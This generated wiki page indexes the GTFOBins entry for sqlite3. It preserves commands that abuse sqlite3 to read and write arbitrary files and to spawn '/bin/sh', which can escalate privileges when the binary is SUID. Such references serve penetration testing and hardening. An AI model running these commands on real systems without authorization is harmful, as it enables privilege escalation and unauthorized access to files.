---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# sqlite3

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `sqlite3` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sqlite3` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [sqlite3](../../tools/linux/sqlite3.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | sqlite3 |
| name | sqlite3 |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/sqlite3/ |

## Preserved Source Material

```yaml
_body: ''
_name: sqlite3
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sqlite3
functions:
  file-read:
  - binary: false
    code: 'sqlite3 <<EOF

      CREATE TABLE x(x TEXT);

      .import /path/to/input-file x

      SELECT * FROM x;

      EOF'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - binary: false
    code: sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: sqlite3 /dev/null '.shell /bin/sh'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
